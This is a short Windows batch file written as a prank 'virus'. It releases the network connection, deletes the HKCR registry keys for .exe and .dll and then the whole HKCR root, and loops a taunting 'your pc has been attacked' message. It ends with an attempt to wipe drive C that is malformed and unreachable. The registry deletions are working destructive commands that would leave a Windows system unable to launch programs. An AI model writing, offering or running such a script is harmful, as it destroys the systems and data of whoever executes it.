@Echo off
Ipconfig /release
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*
:MESSAGE
ECHO Hahaha your pc has been attacked by virus
GOTO MESSAGE
Del C: *.* |y
